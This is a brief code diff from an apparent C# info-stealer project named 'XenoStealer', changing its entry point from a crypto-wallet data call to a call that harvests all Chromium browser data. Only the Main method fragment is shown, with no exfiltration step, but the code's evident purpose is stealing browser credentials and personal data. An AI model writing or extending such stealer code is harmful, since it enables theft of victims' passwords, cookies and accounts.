@@ -13,7 +13,7 @@ namespace XenoStealer
     {
         public static void Main(string[] args)
         {
-            var f = Crypto.GetInfo();
+            var f = Chromium.GetAllInfo(DataExtractionStructs.ChromiumBrowserOptions.All);
             var d = "";
         }
     }
